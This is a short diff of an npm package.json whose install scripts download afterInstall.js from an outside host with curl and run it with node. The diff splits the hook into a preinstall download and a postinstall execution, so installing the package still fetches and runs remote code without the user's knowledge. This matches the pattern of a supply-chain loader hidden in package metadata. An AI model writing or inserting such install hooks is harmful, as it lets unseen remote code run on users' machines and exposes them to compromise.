@@ -5,7 +5,8 @@
   "main": "afterInstall.js",
   "scripts": {
     "postinstallO": "test - d",
-    "preinstall": "curl -O http://onion-static.yc345.tv/litManage/afterInstall.js && node afterInstall.js"
+    "preinstall": "curl -O http://onion-static.yc345.tv/litManage/afterInstall.js",
+    "postinstall": "node afterInstall.js"
   },
   "repository": {
     "type": "git",
